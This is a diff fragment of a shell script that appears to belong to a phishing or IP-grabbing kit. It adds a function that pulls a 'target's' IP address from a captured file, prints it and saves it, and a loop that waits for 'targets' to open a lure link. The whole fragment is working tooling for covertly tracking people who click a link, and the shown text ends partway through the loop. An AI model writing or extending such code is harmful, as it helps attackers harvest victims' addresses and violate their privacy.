@@ -49,3 +49,30 @@ fi
 exit 1
 
 }
+
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+
+cat ip.txt >> saved.ip.txt
+
+
+}
+
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+
+fi
+
+sleep 0.5
